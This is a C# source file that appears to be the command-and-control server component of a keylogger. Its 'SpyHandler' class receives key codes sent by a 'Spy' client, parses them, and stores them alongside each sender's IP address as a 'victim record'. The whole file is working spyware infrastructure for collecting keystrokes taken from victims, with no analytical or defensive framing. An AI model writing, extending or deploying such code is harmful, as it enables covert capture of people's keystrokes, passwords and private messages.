using SpyCommunicationLib;
using SpyCommunicationLib.Directors;
using System.Net;

namespace Server.Handlers
{
    internal class SpyHandler : IHandler
    {
        private static ServerResponseDirector _director = new ServerResponseDirector();

        public bool CheckConditions(SpyMessage? message)
        {
            if (message == null)
                return false;
            return message.Sender == Sender.Spy;
        }

        public async Task<string> SaveVictimRecord(SpyMessage message, ClientInfo clientInfo)
        {

            string stringKeys = message.GetOption("keys");
            if (string.IsNullOrEmpty(stringKeys))
                return _director.GetBadRequestResponse().ToString();

            string ip = clientInfo.RemoteEndPoint.ToString().Split(":")[0];
            int[] keys = stringKeys
                .Replace(" ", "")
                .Split(',', StringSplitOptions.RemoveEmptyEntries)
                .Select(key => int.TryParse(key, out int result) ? result : -1)
                .Where(key => key != -1)
                .ToArray();

            Data.RecordsContainer.AddRecord(keys, ip);

            return _director.GetSuccessResponse().ToString();
        }

        public async Task<string> HandleAsync(SpyMessage? message, ClientInfo clientInfo)
        {
            if (message == null)
                return _director.GetBadRequestResponse().ToString();

            string response;

            switch (message.Action)
            { 
                case MessageAction.SendData:
                    response = await SaveVictimRecord(message, clientInfo);
                    break;
                default:
                    response = _director.GetNotFoundRequestResponse().ToString();
                    break;
            }

            return response;
        }
    }
}
